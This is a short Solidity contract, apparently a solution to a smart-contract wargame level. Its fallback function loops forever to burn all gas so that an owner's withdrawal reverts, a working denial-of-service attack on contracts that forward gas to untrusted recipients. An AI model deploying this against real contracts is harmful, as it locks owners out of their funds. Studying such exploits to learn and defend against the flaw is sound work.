// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract DenialHack {
    fallback() external payable {
        // consume all gas so that transaction will revert
        // owner cannot withdraw funds
        while (true) {}
    }
}
